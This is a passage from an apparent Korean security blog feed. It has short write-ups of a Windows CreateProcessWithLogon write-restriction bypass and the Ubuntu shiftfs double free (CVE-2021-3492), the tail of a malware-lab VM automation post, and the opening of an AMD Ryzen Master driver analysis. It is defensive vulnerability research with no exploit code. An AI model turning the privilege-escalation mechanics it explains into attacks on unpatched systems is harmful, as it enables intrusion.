&#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xC2E4;&#xC81C;&#xB85C; &#xB85C;&#xCEEC;&#xC5D0; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD588;&#xC744; &#xB54C; &#xC791;&#xC5C5;&#xD45C;&#xC2DC;&#xC904; &#xACE0;&#xC815;&#xC774; &#xC548;&#xB418;&#xB354;&#xAD70;&#xC694;&#x2026; &#xC77C;&#xC2DC;&#xC801;&#xC778; &#xAC74;&#xAC00;? &#xC544;&#xBB34;&#xD2BC; &#xC774;&#xAC83; &#xB54C;&#xBB38;&#xC5D0; &#xC0BD;&#xC9C8;&#xC744; &#xC880; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#x3160;&#x3160;)</p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC544;&#xC26C;&#xC6B4; &#xBD80;&#xBD84;&#xC740; Windbg Preview &#xBC84;&#xC804;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xC2F6;&#xC5C8;&#xB294;&#xB370;, Store apps&#xB97C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB85C; &#xC62E;&#xAE30;&#xB294; &#xACFC;&#xC815;&#xC774; &#xBCF5;&#xC7A1;&#xD558;&#xB354;&#xAD70;&#xC694;. &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xB9C1;&#xD06C;&#xB97C; &#xC9C1;&#xC811; &#xC8FC;&#xB294; &#xC0AC;&#xC774;&#xD2B8;&#xB97C; &#xBC1C;&#xACAC;&#xD574;&#xC11C; &#xC791;&#xC5C5;&#xC744; &#xD574;&#xBCF4;&#xC558;&#xC73C;&#xB098;, &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB2E4;&#xB294; &#xB9D0;&#xC774; &#xACC4;&#xC18D; &#xB5A0;&#xC11C;&#x2026; &#x315C;&#x315C; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xD3EC;&#xAE30;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB098;&#xC911;&#xC5D0; chocolatey&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xAE38; &#xAC04;&#xC808;&#xD788; &#xAE30;&#xC6D0;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC7A1;&#xB2F4;&#xC774; &#xAE38;&#xC5C8;&#xB124;&#xC694;! &#xC81C;&#xAC00; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xB9CC; &#xCD94;&#xAC00;&#xD574;&#xB193;&#xACE0;, &#xC800;&#xB294; &#xBCF4;&#xD1B5; &#xC2DC;&#xC791; - &#xAC80;&#xC0C9; &#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC120;&#xD638;&#xD574;&#xC11C; (&#xAE54;&#xB054;&#xD55C; &#xAC78; &#xC88B;&#xC544;&#xD569;&#xB2C8;&#xB2E4;.) &#xC0AC;&#xC2E4; &#xBC14;&#xD0D5;&#xD654;&#xBA74; &#xBC14;&#xB85C;&#xAC00;&#xAE30;&#xB098; &#xC791;&#xC5C5; &#xD45C;&#xC2DC;&#xC904; &#xACE0;&#xC815; &#xAE30;&#xB2A5;&#xC744; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC694;. &#xC774; &#xBD80;&#xBD84;&#xB3C4; &#xCDE8;&#xD5A5;&#xC5D0; &#xB9DE;&#xAC8C; &#xC218;&#xC815;&#xD558;&#xC154;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC804;&#xCCB4; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB294; <a href="https://github.com/idioth/malvm">github</a>&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xB2C8;, &#xB9CE;&#xC740; &#xAD6C;&#xACBD; &#xBD80;&#xD0C1;&#xB4DC;&#xB9AC;&#xACE0; &#xD53C;&#xB4DC;&#xBC31; &#xB610;&#xD55C; &#xC5B8;&#xC81C;&#xB098; &#xD658;&#xC601;&#xC785;&#xB2C8;&#xB2E4;! &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4; :)</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/">https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/</a></p><p><a href="https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10">https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>powershell</tag>
      
      <tag>automated</tag>
      
      <tag>virtual machine</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows: CreateProcessWithLogon Write Restricted Service EoP</title>
    <link href="/2021/07/16/j0ker/2021-07-16/"/>
    <url>/2021/07/16/j0ker/2021-07-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2194">https://bugs.chromium.org/p/project-zero/issues/detail?id=2194</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Vista &#xC774;&#xD6C4;&#xB85C; <code>Windows Service Hardening</code>&#xC774;&#xB77C;&#xB294; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;&#xC758; &#xAE30;&#xB2A5; &#xC911; &#xD558;&#xB098;&#xAC00; <code>Write Restrict token</code>&#xC778;&#xB370;, &#xC774;&#xB294; &#xD574;&#xB2F9; &#xD1A0;&#xD070;&#xC744; &#xAC00;&#xC9C4; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xB978; &#xB9AC;&#xC18C;&#xC2A4;&#xC5D0; &#xC4F0;&#xAE30;&#xAC00; &#xC81C;&#xD55C;&#xB418;&#xB294; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;&#xC785;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; Windows 10&#xC5D0;&#xC11C;&#xB294; &#xB300;&#xB7B5; 10&#xAC1C;&#xC758; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xD574;&#xB2F9; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>James Forshaw&#xAC00; &#xC774;&#xBC88;&#xC5D0; &#xCC3E;&#xC740; &#xCDE8;&#xC57D;&#xC810;(&#xBE44;&#xB85D; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xAC00; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB77C;&#xACE0; &#xC778;&#xC815;&#xD558;&#xC9C4; &#xC54A;&#xC558;&#xC9C0;&#xB9CC;&#x2026;)&#xC740; &#xC774; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>Write Restriction</code>&#xC774; &#xAC78;&#xB9B0; &#xC11C;&#xBE44;&#xC2A4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; <code>CreateProcessWithLogon</code> &#xD568;&#xC218;&#xC5D0; <code>LOGON_NERCREDENTIALS_ONLY</code> &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC138;&#xD305;&#xD558;&#xACE0; &#xD638;&#xCD9C;&#xD560; &#xC2DC; Write Restriction&#xC774; &#xC801;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C8;&#xB85C;&#xC6B4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C8;&#xB85C;&#xC6B4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; Write Restriction&#xC774; &#xAC78;&#xB824;&#xC788;&#xC9C0; &#xC54A;&#xC744; &#xBFD0; &#xC544;&#xB2C8;&#xB77C; <code>INTERACTIVE</code> &#xADF8;&#xB8F9; SID&#xAC00; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>LOCAL SERVICE</code>, <code>NETWORK SERVICE</code> &#xB610;&#xB294; <code>Virtual Service Account</code> &#xACC4;&#xC815;&#xC5D0;&#xC11C;&#xB3C4; &#xD2B8;&#xB9AC;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xBA70; <code>SeImpersonatePrivilege</code>&#xB098; <code>SeAssignPrimaryTokenPrivilege</code> &#xAC19;&#xC740; &#xAD8C;&#xD55C;&#xC774; &#xD544;&#xC694;&#xD558;&#xC9C0;&#xB3C4; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>j0ker</tag>
      
      <tag>token</tag>
      
      <tag>createprocesswithlogon</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3492: Ubuntu Shiftfs driver double free vulnerability</title>
    <link href="/2021/07/15/idioth/2021-07-15/"/>
    <url>/2021/07/15/idioth/2021-07-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.synacktiv.com/publications/exploitation-of-a-double-free-vulnerability-in-ubuntu-shiftfs-driver-cve-2021-3492.html">EXPLOITATION OF A DOUBLE FREE VULNERABILITY IN UBUNTU SHIFTFS DRIVER (CVE-2021-3492)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ubuntu Groovy (20.10, kernel 5.8.0-50.56 &#xC774;&#xC804; &#xBC84;&#xC804;)</li><li>Ubuntu Focal (20.04, kernel 5.4.0-72.80 &#xC774;&#xC804; &#xBC84;&#xC804;)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Pwn2Own Vancouver 2021&#xC5D0;&#xC11C; Ubuntu Groovy (20.10)&#xACFC; Ubuntu Focal (20.04)&#xC758; Shiftfs &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; double free &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>shiftfs&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; bind-mount &#xD558;&#xACE0; &#xB9C8;&#xC6B4;&#xD2B8;&#xD55C; user namespace owner&#xC758; &#xB9F5;&#xC744; &#xD1B5;&#xD574; UID&#xC640; GID&#xB97C; shift &#xD560; &#xC218; &#xC788;&#xB294; overlay &#xC885;&#xB958;&#xC758; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC785;&#xB2C8;&#xB2E4;. shiftfs&#xB294; &#xD2B9;&#xC815; ioctl&#xB85C; &#xD578;&#xB4E4;&#xB9C1;&#xB418;&#xBA70; &#xD5C8;&#xC6A9;&#xB41C; ioctl&#xC744; &#xC804;&#xB2EC;&#xBC1B;&#xC744; &#xC2DC; <code>shiftfs_real_ioctl</code>&#xC744; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. <code>BTRFS_IOC_SNAP_CREATE</code> ioctl&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xBA74; <code>shiftfs_btrfs_ioctl_fd_replace</code> &#xD568;&#xC218;&#xB294; userspace&#xC5D0;&#xC11C; kernel space&#xB85C; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xC5EC; <code>btrfs_ioctl_vol_args</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xD30C;&#xC77C; &#xB514;&#xC2A4;&#xD06C;&#xB9BD;&#xD130;&#xB97C; bottom &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; inode&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xC0C8; &#xB514;&#xC2A4;&#xD06C;&#xB9BD;&#xD130;&#xB85C; &#xAD50;&#xCCB4;&#xD558;&#xC5EC; legacy btrfs ioctl&#xC744; &#xB798;&#xD551;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; ioctl&#xC774; shiftfs &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB418;&#xBA74; &#xD578;&#xB4E4;&#xB9C1; &#xCF54;&#xB4DC;&#xB294; <code>btrfs_ioctl_vol_args</code>&#xB97C; userpsace&#xC5D0;&#xC11C; kernel space&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; <code>fd</code>&#xB97C; &#xAD50;&#xCCB4;&#xD55C; &#xD6C4; &#xB2E4;&#xC2DC; userspace&#xB85C; &#xBCF5;&#xC0AC;&#xB429;&#xB2C8;&#xB2E4;. &#xBCF5;&#xC0AC;&#xAC00; &#xC2E4;&#xD328;&#xD560; &#xACBD;&#xC6B0;, <code>copy_to_user</code> &#xD568;&#xC218;&#xB294; &#xB0A8;&#xC544;&#xC788;&#xB294; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xC5EC; &#xC591;&#xC218; &#xAC12;&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>shiftfs_real_ioctl</code>&#xC740; &#xC74C;&#xC218; &#xAC12;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xC624;&#xB958;&#xAC00; &#xB0AC;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB354;&#xB77C;&#xB3C4; <code>shiftfs_btrfs_ioctl_fd_restore</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xB2E4;&#xB978; <code>copy_to_user</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; <code>btrfs_ioctl_vol_args</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; userpace&#xB85C; &#xBCF4;&#xB0B8; &#xB2E4;&#xC74C; free &#xD569;&#xB2C8;&#xB2E4;.</p><p><code>shiftfs_btrfs_ioctl_fd_restore</code>&#xB97C; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xAC19;&#xC740; fd&#xB97C; &#xB450; &#xBC88; &#xB2EB;&#xACE0; &#xAC19;&#xC740; &#xAD6C;&#xC870;&#xCCB4;&#xAC00; &#xB450; &#xBC88; free &#xB429;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAD6C;&#xC870;&#xCCB4;&#xB294; userspace&#xC5D0;&#xC11C; &#xBCF5;&#xC0AC;&#xB418;&#xB294; &#xB3D9;&#xC548; <code>shiftfs_btrfs_ioctl_fd_replace</code>&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xBA70; &#xCEE4;&#xB110; &#xD568;&#xC218; <code>memdup_user</code>&#xB294; <code>copy_from_user</code>&#xC640; &#xB3D9;&#xC2DC;&#xC5D0; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>shiftfs_btrfs_ioctl_fd_replace</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>memdup_user</code>&#xAC00; &#xD560;&#xB2F9;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xACE0; <code>copy_to_user</code>&#xB294; &#xC2E4;&#xD328;&#xD558;&#xBA74; <code>shiftfs_btrfs_ioctl_fd_restore</code>&#xC5D0;&#xC11C; <code>kfree</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xCCAB; &#xBC88;&#xC9F8; free&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xACE0; <code>shiftfs_real_ioctl</code>&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; <code>shiftfs_btrfs_ioctl_fd_restore</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; Potential leak&#xACFC; <code>kfree</code>&#xB97C; &#xD1B5;&#xD55C; &#xB450; &#xBC88;&#xC9F8; free&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xC5EC; double free bug&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>double free bug</tag>
      
      <tag>idioth</tag>
      
      <tag>ubuntu</tag>
      
      <tag>driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 공대오빠가 알려주는 Windows Driver Part 2 - CVE-2020-12928: AMD Ryzen Master 분석(1)</title>
    <link href="/2021/07/14/l0ch/windows-driver-part2/"/>
    <url>/2021/07/14/l0ch/windows-driver-part2/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 1 - Setting Up Kernel Debugging</a></p><p>&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 2 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(1) &#x2190; Now!</p><p><a href="http://hackyboiz.github.io/2021/07/28/l0ch/windows-driver-part3/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 3 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(2)</a></p><p><a href="http://hackyboiz.github.io/2021/08/11/l0ch/windows-driver-part4/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(3)</a></p><hr><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xD55C; &#xB2EC; &#xB9CC;&#xC5D0; &#xB3CC;&#xC544;&#xC628; &#xC708;&#xB3C4;&#xC6B0; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC2DC;&#xB9AC;&#xC988;&#xC785;&#xB2C8;&#xB2E4;. &#xC9C0;&#xB09C;&#xBC88; &#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAE45; &#xC138;&#xD305;&#xC5D0; &#xC774;&#xC5B4; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xC708;&#xB3C4;&#xC6B0; third-party &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC6D0;&#xB370;&#xC774;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCFC; &#xAC74;&#xB370;&#xC694;, &#xC774;&#xC81C; &#xBCF4;&#xB2C8;&#xAE4C; &#xC2DC;&#xB9AC;&#xC988; &#xC81C;&#xBAA9;&#xC744; &#xBB50;&#xAC19;&#xC774; &#xC9D3;&#xAE34; &#xD588;&#xB124;&#xC694;. &#xB0B4;&#xAC00; &#xC65C; &#xC800;&#xB7AC;&#xC744;&#xAE4C;..? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled.png" alt="windows-driver-part2/Untitled.png"></p><blockquote><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xB294; &#xACF5;&#xB300; &#x201C;&#xC544;&#xC800;&#xC528;&#x201D;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p></blockquote><h1 id="AMD-Ryzen-Master"><a href="#AMD-Ryzen-Master" class="headerlink" title="AMD Ryzen Master"></a>AMD Ryzen Master</h1><p><img src="/2021/07/14/l0ch/windows-driver-part2/AMD.png" alt="windows-driver-part2/AMD.png"></p><p>&#xC624;&#xB298; &#xBD84;&#xC11D;&#xD560; AMD Ryzen Master&#xB294; &#xB77C;&#xC774;&#xC820; CPU&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4; &#xC911; &#xC624;&#xBC84;&#xD074;&#xB7ED;&#xC5D0; &#xAD00;&#xC2EC;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xB4E4;&#xC5B4;&#xBCF4;&#xC168;&#xC744; &#xC775;&#xC219;&#xD55C; &#xC720;&#xD2F8;&#xB9AC;&#xD2F0;&#xC785;&#xB2C8;&#xB2E4;! &#xC800;&#xB3C4; &#xC791;&#xB144;&#xC5D0; &#xB77C;&#xC774;&#xC820; CPU&#xB97C; &#xCC98;&#xC74C; &#xC0AC;&#xC11C; &#xC778;&#xC0DD; &#xCCAB; &#xC624;&#xBC84;&#xD074;&#xB7ED;&#xC744; &#xD558;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370;, &#xBC14;&#xC774;&#xC624;&#xC2A4; &#xBA54;&#xB274;&#xC5D0;&#xC11C; &#xBB58; &#xC5B4;&#xB5BB;&#xAC8C; &#xD574;&#xC57C; &#xD560;&#xC9C0; &#xBAB0;&#xB77C;&#xC11C; &#xC5BC;&#xD0C0;&#xB2E4;&#xAC00; &#xB9C8;&#xC6B0;&#xC2A4; &#xD074;&#xB9AD; &#xBA87; &#xBC88;&#xC5D0; &#xC624;&#xBC84;&#xD074;&#xB7ED;&#xC774; &#xC9E0; &#xD558;&#xACE0; &#xB41C;&#xB2E4;&#xAE38;&#xB798; &#xC720;&#xC6A9;&#xD558;&#xAC8C; &#xC37C;&#xC5C8;&#xC8E0;. &#xBB3C;&#xB860; &#xC7AC;&#xBD80;&#xD305;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xC124;&#xC815; &#xC801;&#xC6A9;&#xD574;&#xC918;&#xC57C; &#xD558;&#xB294; &#xAC8C; &#xADC0;&#xCC2E;&#xC544;&#xC11C; &#xACB0;&#xAD6D; &#xBC14;&#xC774;&#xC624;&#xC2A4;&#xC5D0;&#xC11C; &#xC124;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%201.png" alt="windows-driver-part2/Untitled%201.png"></p><blockquote><p>&#xC624;&#xBC84;&#xD074;&#xB7ED;&#xB3C4; &#xBABB;&#xD558;&#xB294; &#xCEF4;&#xC54C;&#xBABB;&#x315C;</p></blockquote><p>&#xC774;&#xAC74; &#xC5EC;&#xB2F4;&#xC778;&#xB370;, &#xC9C0;&#xAE08; &#xC4F0;&#xB294; CPU&#xAC00; &#xC624;&#xBC84;&#xD074;&#xB7ED; &#xC548;&#xD55C; &#xC21C;&#xC815;&#xC0C1;&#xD0DC;&#xC5D0;&#xC11C;&#xB294; &#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0; &#xB728;&#xB294;&#xB370; &#xC624;&#xBC84;&#xD074;&#xB7ED; &#xD558;&#xBA74; &#xBA40;&#xCA61;&#xD558;&#xB354;&#xB77C;&#xAD6C;&#xC694;. &#xC218;&#xC728;&#xC774; &#xC88B;&#xAE38;&#xB798; &#xADF8;&#xB0E5; &#xC4F0;&#xACE0; &#xC788;&#xB294;&#xB370;.. &#xBB54;&#xAC00; &#xCC1D;&#xCC1D;&#xD55C; &#xAC74; &#xAE30;&#xBD84; &#xD0D3;&#xC77C; &#xAC70;&#xC57C; &#xC544;&#xB9C8;</p><blockquote><p>&#xBCF8;&#xC778;(&#xC0C8;&#xCEF4; &#xB9DE;&#xCDB0;&#xC11C; &#xC2E0;&#xB0A8;) : &#xB2D8;&#xB4E4; &#xC2DC;&#xD4E8; &#xC21C;&#xC815;&#xC740; &#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0; &#xB728;&#xB294;&#xB370; &#xC624;&#xBC84;&#xD074;&#xB7ED; &#xD558;&#xBA74; &#xC798; &#xB3CC;&#xC544;&#xAC10; &#x314B;&#x314B; &#xC2E0;&#xAE30;&#xD558;&#xC8E0;<br>??? : &#xC6B0;&#xB9B0; &#xADF8;&#xAC78; &#xCD08;&#xAE30; &#xBD88;&#xB7C9;&#xC774;&#xB77C;&#xACE0; &#xBD80;&#xB974;&#xAE30;&#xB85C; &#xD588;&#xC5B4;&#xC694;.</p></blockquote><p>&#x2026;? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%202.png" alt="windows-driver-part2/Untitled%202.png"></p><blockquote><p>&#xADF8;&#xB798;&#xB3C4; 1&#xB144;&#xC9F8; &#xC798; &#xC4F0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;..</p></blockquote><p>&#xC544;&#xBB34;&#xD2BC; &#xC624;&#xB298;&#xC740; &#xC791;&#xB144;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; AMD Ryzen Master&#xC758; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810; CVE-2020-12928 &#xC744; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! OS&#xD658;&#xACBD;&#xC740; Windows 10 &#xBE4C;&#xB4DC; 19043.1083&#xC5D0;&#xC11C;, &#xD0C0;&#xAC9F;&#xC778; AMD Ryzen Master&#xB294; &#xCDE8;&#xC57D;&#xD55C; AMDRyzenMasterDriverV15 &#xBC84;&#xC804;&#xC758; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xD3EC;&#xD568;&#xB41C;  2.1.1.1472 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xAD6C;&#xBC84;&#xC804; &#xCC3E;&#xB294;&#xB370; &#xD558;&#xB8E8; &#xC885;&#xC77C; &#xAC78;&#xB824;&#xBC84;&#xB9BC; &#x314E;&#x314E;. .</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%203.png" alt="windows-driver-part2/Untitled%203.png"></p><blockquote><p>&#xC544; &#xAD6C;&#xBC84;&#xC804; &#xAD6C;&#xD558;&#xAE30; &#xC9C4;&#xC9DC; &#xB108;&#xBB34; &#xC5B4;&#xB824;&#xC6E0;&#xB2E4; &#x3141;&#x3134;&#x3147;&#x3139;&#x3134;&#x3147;&#x3141;&#x3139;&#x3147;&#x3141;</p></blockquote><p>&#xC774;&#xC81C;.. &#xC124;&#xCE58;&#xD558;&#xACE0; &#xC124;&#xCE58; &#xACBD;&#xB85C;&#xB97C; &#xCC3E;&#xC544;&#xAC00;&#xBCF4;&#xBA74;</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip.png" alt="windows-driver-part2/tempsnip.png"></p><p>&#xC624;&#xB298;&#xC758; &#xC8FC;&#xC778;&#xACF5; 